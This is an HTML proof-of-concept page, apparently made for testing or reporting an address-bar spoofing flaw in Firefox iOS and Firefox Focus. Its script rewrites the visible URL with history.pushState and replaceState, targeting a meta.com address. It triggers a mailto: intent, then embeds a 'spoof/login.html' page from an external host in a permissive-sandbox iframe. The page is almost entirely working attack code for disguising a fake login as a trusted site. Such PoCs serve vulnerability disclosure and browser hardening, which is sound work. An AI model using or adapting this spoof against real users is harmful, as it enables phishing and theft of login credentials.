<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Firefox iOS Address Bar + iframe PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: system-ui, -apple-system;
  padding: 16px;
  background: #f5f5f7;
}
iframe {
  width: 100%;
  height: 260px;
  border: 1px solid #ccc;
  border-radius: 10px;
  margin-top: 12px;
}
.notice {
  font-size: 13px;
  color: #b00020;
  margin-top: 10px;
}
</style>
</head>
<body>

<h3>Firefox iOS Navigation / iframe PoC</h3>

<button id="run">Run Test</button>

<div class="notice">
Test on Firefox iOS / Firefox Focus
</div>

<script>
document.getElementById('run').onclick = () => {

  // Step 1: change visible URL (same document)
  history.pushState({}, '', '/trusted-path');

  // Step 2: simulate external intent (optional, comment out if not needed)
  setTimeout(() => {
    location.href = 'mailto:test@example.com';
  }, 300);

  // Step 3: after returning, render iframe content
  setTimeout(() => {
    document.body.innerHTML += `
      <h4>Top-level URL should be example.org</h4>
      <iframe
        src="https://cnfdnfial-ops.github.io/spoof/login.html"
        sandbox="allow-scripts allow-forms allow-same-origin">
      </iframe>
      <p>
        Observe address bar vs iframe-rendered content.
      </p>
    `;

    // Optional: force top-level navigation
    history.replaceState({}, '', 'https://meta.com:9090');
  }, 1200);
};
</script>

</body>
</html>
